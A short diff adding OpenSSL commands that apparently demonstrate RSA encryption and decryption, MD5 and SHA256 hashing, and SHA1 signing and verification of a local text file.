+openssl rsautl -encrypt -in plain.txt -pubin -inkey pubkey.pem -out c1.bin
+type c1.bin
+openssl pkeyutl -decrypt -in c1.bin -inkey pvtkey.pem -out decplaintext.txt
+Type decplaintext.txt
+openssl md5 plain.txt
+Openssl SHA256 plain.txt
+openssl dgst -sha1 -sign pvtkey.pem -out s.bin plain.txt
+openssl dgst -sha1 -verify pubkey.pem -signature s.bin plain.txt
